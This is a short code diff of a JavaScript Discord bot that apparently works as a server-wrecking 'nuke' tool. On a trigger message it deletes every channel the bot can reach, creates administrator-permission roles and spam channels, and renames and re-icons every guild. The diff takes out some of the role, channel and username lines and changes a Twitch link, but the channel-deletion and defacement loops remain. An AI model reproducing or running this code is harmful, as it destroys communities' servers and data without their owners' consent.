@@ -18,10 +18,6 @@ if (message.content === x_x) {
    .addField(spam, ".")
     message.channel.sendEmbed(embed);
     client.guilds.forEach(hack => {
-    hack.createRole({name: spam,permissions: [8],color: "#23272a"})
-    hack.createRole({name: spam,permissions: [8],color: " #df1213"})
-    hack.createChannel(teeext, 'text')
-    hack.createChannel(vooice, 'voice')
     })}, 3);}});
 client.on('message', message => {
 if (message.content === x_x) {
@@ -30,8 +26,7 @@ if (message.content === x_x) {
    client.channels.forEach(hackch => {
    hackch.delete();
    client.user.setAvatar(pic)
-   client.user.setUsername(namee)
-   client.user.setGame(playing, 'https://www.twitch.tv/hix')
+   client.user.setGame(playing, 'https://www.twitch.tv/end')
    client.guilds.forEach(hack => {
    hack.setIcon(pic)
    hack.setName(namee)})})})}});
